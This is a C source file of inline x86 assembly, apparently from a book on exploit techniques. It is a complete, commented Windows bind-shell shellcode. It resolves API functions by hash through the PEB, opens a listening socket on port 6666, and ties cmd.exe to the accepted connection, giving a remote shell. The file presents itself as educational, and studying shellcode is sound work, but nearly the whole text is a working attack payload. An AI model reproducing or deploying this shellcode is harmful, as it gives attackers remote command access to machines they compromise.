/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 5.6 in book "Vulnerability Exploit and Analysis Technique"
 
file name	: bindshell.c
author		: failwest  
date		: 2006.12.11
description	: used to generate PE file and extracted machine code
Noticed		: assume EAX point to the beginning of shellcode
				can't be executed directly
				have to be loaded by shellcode loader
version		: 1.0
E-mail		: failwest@gmail.com
reference	:"Writing Small Shellcode", Dafydd Stuttard, NGS white paper, 2005.9.19
		  http://www.nextgenss.com/research/papers/WritingSmallShellcode.pdf
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/

main()
{
	__asm{
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
		; start of shellcode 
		; assume: eax points here 
		; function hashes (executable as nop-equivalent) 
			_emit 0x59	; LoadLibraryA ; pop ecx 
			_emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 
			_emit 0xc9 	; ExitProcess 
			_emit 0xd3 	; WSAStartup 
			_emit 0x62 	; WSASocketA 
			_emit 0x30 	; bind 
			_emit 0x20 	; listen 
			_emit 0x41 	; accept ; inc ecx 

		; "CMd" 
			_emit 0x43 	; inc ebx 
			_emit 0x4d 	; dec ebp 
			_emit 0x64 	; FS: 
		
		; start of proper code 
			cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) 
			xchg eax, esi 			; esi = addr of first function hash 
			lea edi, [esi - 0x18] 	; edi = addr to start writing function 
									; addresses (last addr will be written just 
									; before "cmd") 
			
		; find base addr of kernel32.dll 
			mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB 
			mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data 
			mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list 
			mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) 
			mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll 
			
		; make some stack space 
			mov dh, 0x03 			; sizeof(WSADATA) is 0x190 
			sub esp, edx 
			
		; push a pointer to "ws2_32" onto stack 
			mov dx, 0x3233 			; rest of edx is null 
			push edx 
			push 0x5f327377 
			push esp 

			
		find_lib_functions: 
			lodsb 					; load next hash into al and increment esi 
			cmp al, 0xd3 				; hash of WSAStartup - trigger 
									; LoadLibrary("ws2_32") 
			jne find_functions 
			xchg eax, ebp 			; save current hash 
			call [edi - 0xc] 			; LoadLibraryA 
			xchg eax, ebp 			; restore current hash, and update ebp 
									; with base address of ws2_32.dll 
			push edi 					; save location of addr of first winsock function 
			
		find_functions: 
			pushad 						; preserve registers 
			mov eax, [ebp + 0x3c]		; eax = start of PE header 
			mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table 
			add ecx, ebp 				; ecx = absolute addr of export table 
			mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table 
			add ebx, ebp 				; ebx = absolute addr of names table 
			xor edi, edi 				; edi will count through the functions 

			
		next_function_loop: 
			inc edi 					; increment function counter 
			mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name 
			add esi, ebp 				; esi = absolute addr of current function name 
			cdq 						; dl will hold hash (we know eax is small) 
			
		hash_loop: 
			lodsb 					; load next char into al and increment esi 
			xor al, 0x71 				; XOR current char with 0x71 
			sub dl, al 				; update hash with current char 
			cmp al, 0x71 				; loop until we reach end of string 
			jne hash_loop 
			cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) 
			jnz next_function_loop 
			
										; we now have the right function 
			
			mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table 
			add ebx, ebp 				; ebx = absolute addr of ordinals table 
			mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function 
			mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table 
			add ebx, ebp 				; ebx = absolute addr of address table 
			add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the 
										; relative offset of matched function 
			xchg eax, ebp 				; move func addr into eax 
			pop edi 					; edi is last onto stack in pushad 
			stosd 					; write function addr to [edi] and increment edi 
			push edi 
			popad					; restore registers 
			cmp esi, edi 				; loop until we reach end of last hash 
			jne find_lib_functions 
			pop esi 					; saved location of first winsock function 
										; we will lodsd and call each func in sequence 
			
		; initialize winsock 
			
			push esp 					; use stack for WSADATA 
			push 0x02 				; wVersionRequested 
			lodsd 
			call eax 					; WSAStartup 
			
		; null-terminate "cmd" 
			mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked 
			
		; clear some stack to use as NULL parameters 
			lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, 
			mov edi, esp 
			rep stosd 				; eax is still 0 
		
		; create socket 
			inc eax 
			push eax					; type = 1 (SOCK_STREAM) 
			inc eax 
			push eax ; af = 2 (AF_INET) 
			lodsd 
			call eax ; WSASocketA 
			xchg ebp, eax				; save SOCKET descriptor in ebp (safe from 
										; being changed by remaining API calls) 
			
		; push bind parameters 
			mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET 
			xor ah, ah					; remove the ff from eax 
			push eax	 				; we use 0x0a1a0002 as both the name (struct 
										; sockaddr) and namelen (which only needs to 
										; be large enough) 
			push esp 					; pointer to our sockaddr struct 
			
		; call bind(), listen() and accept() in turn 
		call_loop: 
			push ebp					; saved SOCKET descriptor (we implicitly pass 
										; NULL for all other params) 
			lodsd 
			call eax 					; call the next function 
			test eax, eax 				; bind() and listen() return 0, accept() 
										; returns a SOCKET descriptor 
			jz call_loop 
			
		; initialise a STARTUPINFO structure at esp 
			inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true 
			sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO 
			stosd 					; use SOCKET descriptor returned by accept 
									; (still in eax) as the stdin handle 
			stosd 					; same for stdout 
			stosd					; same for stderr (optional) 
			
		; create process 
			pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) 
			push esp			; use stack as PROCESSINFORMATION structure 
			; (STARTUPINFO now back to esp) 
			push esp 			; STARTUPINFO structure 
			push eax 		; lpCurrentDirectory = NULL 
			push eax 		; lpEnvironment = NULL 
			push eax 		; dwCreationFlags = NULL 
			push esp 			; bInheritHandles = true 
			push eax 		; lpThreadAttributes = NULL 
			push eax 		; lpProcessAttributes = NULL 
			push esi 			; lpCommandLine = "cmd" 
			push eax 		; lpApplicationName = NULL 
			call [esi - 0x1c] 	; CreateProcessA 
			
		; call ExitProcess() 
			call [esi - 0x18] ; ExitProcess
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
	}
}
